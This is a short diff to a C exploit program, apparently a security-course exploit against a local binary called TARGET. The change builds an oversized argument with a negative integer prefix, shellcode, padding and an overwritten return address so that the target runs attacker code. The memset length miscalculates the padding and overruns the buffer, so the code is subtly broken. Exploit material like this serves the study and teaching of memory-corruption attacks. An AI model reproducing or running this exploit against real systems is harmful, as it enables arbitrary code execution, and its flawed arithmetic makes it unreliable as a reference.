@@ -9,7 +9,14 @@
 
 int main(void)
 {
-	char arg1[] = "1,\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\xC1\xFE\xD1\xAE\x55\x55\xaa\xaa";
+	char *first = "-2147483379,";
+	
+	char arg1[8608];
+	strcpy(arg1, first);
+	strcat(arg1, shellcode);
+	memset(arg1+strlen(first)+strlen(shellcode),0x55,8608-strlen(first)+strlen(shellcode));
+	*(unsigned *)(&arg1[8592])=0xbeffba48;
+
 	char *args[] = { TARGET, arg1, NULL };
 	char *env[] = { NULL };
 
